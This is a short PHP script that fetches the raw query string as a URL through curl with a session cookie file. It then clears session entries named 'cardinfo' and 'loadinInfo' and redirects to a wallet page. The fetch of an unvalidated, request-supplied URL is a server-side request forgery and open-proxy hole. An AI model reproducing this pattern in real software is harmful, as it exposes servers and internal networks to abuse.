<?php


include './php/xzpc.php';
session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;

$url = htmlspecialchars_decode($_SERVER["QUERY_STRING"]);

include './php/curl.php';
$result = get_curl($cookieSuccess,$url,true);



unset($_SESSION['loadinInfo']);
unset($_SESSION['cardinfo']);
header("location: /wallet.php");

?>